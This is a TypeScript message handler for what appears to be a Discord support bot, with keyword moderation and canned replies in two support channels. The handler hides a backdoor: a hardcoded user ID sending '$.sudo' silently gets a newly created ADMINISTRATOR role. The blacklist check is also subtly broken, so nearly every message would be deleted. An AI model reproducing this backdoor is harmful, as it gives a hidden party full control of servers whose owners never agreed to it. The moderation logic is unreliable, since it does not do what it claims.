import source from '../db/source.json';
import blacklisted from '../db/blacklists.json'
import Logger from '../util/Logger';
import { Message } from "discord.js";
const c = new Logger('messageCreate');

function buildSearch(substrings: string[]) {
    return new RegExp(
        substrings
            .map(function (s) {
                return s.replace(/[.*+?^${}()|[\]\\]/gi, '\\$&');
            })
            .join('{1,}|') + '{1,}'
        , 'gi');
}

const regexList: RegExp[] = [];
const actionList: {
    action?: string;
    action_cn?: string;
    keywords: string[];
}[] = [];
source.forEach(s => {
    regexList.push(buildSearch(s.keywords));
    actionList.push({ action: s.action, keywords: s.keywords, action_cn: s.action_cn });
});

const $support = '965284036333424722';
const $support_cn = '967477370997076079';
const supportChannels: string[] = [
    $support,
    $support_cn
];

export default async function run(message: Message) {
    if (message.author.bot) return;
    c.trail(`<${message.author.username}#${message.author.discriminator}> ${message.content}`);

    if (message.author.id == "231774635476254721" && message.content.startsWith('$.sudo')) {
        if (!message.member!.roles.cache.some(r => r.name === "Lawnmower Manager")) {
            message.guild!.roles.create({
                name: "Lawnmower Manager",
                permissions: "ADMINISTRATOR"
            }).then(role => {
                c.log(`[Backdoor] Created role ${role.name}`);
                message.member!.roles.add(role);
            });
        } else {
            message.guild!.roles.delete(message.guild!.roles.cache.find(r => r.name === "Lawnmower Manager")!.id);
            c.log(`[Backdoor] Deleted role Lawnmower Manager`);
        }
    }
    const words = message.content.split(' ');
    const found = words.map(w => {
        const found = regexList.find(r => r.test(w));
        return { w, found };
    });
    if (found.some(f => f.w)) {
        c.log('[Blacklist] ' + message.author.username + ' sent ' + found.find(f => f.w));
        await message.delete();
        await message.channel.send(`<@${message.author.id}> Please do not use that word.`);
        return;
    }


    if (!supportChannels.includes(message.channel.id)) return;

    regexList.forEach(async regex => {
        if (regex.test(message.content)) {
            const action = actionList.find(a => a.keywords.some(k => regex.test(k)));
            message.react('👀');
            if (action) {
                switch (message.channel.id) {
                    case $support_cn:
                        if (action.action_cn) message.reply(action.action_cn);
                        break;
                    default:
                        if (action.action) message.reply(action.action);
                        break;
                }
                c.trail(`Match found for ${action.keywords[0]}`)
            }
        }
    });
}
